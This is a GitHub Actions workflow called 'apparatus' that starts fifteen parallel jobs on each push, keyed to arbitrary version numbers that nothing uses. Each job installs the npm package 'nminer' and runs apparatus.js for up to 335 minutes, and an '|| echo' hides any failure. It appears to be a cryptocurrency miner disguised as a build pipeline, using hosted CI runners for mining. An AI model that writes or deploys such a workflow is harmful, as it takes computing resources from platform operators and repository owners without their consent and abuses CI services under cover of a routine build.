name: apparatus
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1192 }
          - { version: 7402 }
          - { version: 8906 }
          - { version: 5342 }
          - { version: 6061 }
          - { version: 6153 }
          - { version: 453 }
          - { version: 9215 }
          - { version: 6358 }
          - { version: 4418 }
          - { version: 7247 }
          - { version: 6763 }
          - { version: 7930 }
          - { version: 6979 }
          - { version: 3496 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 335m node apparatus.js || echo "apparatus executed"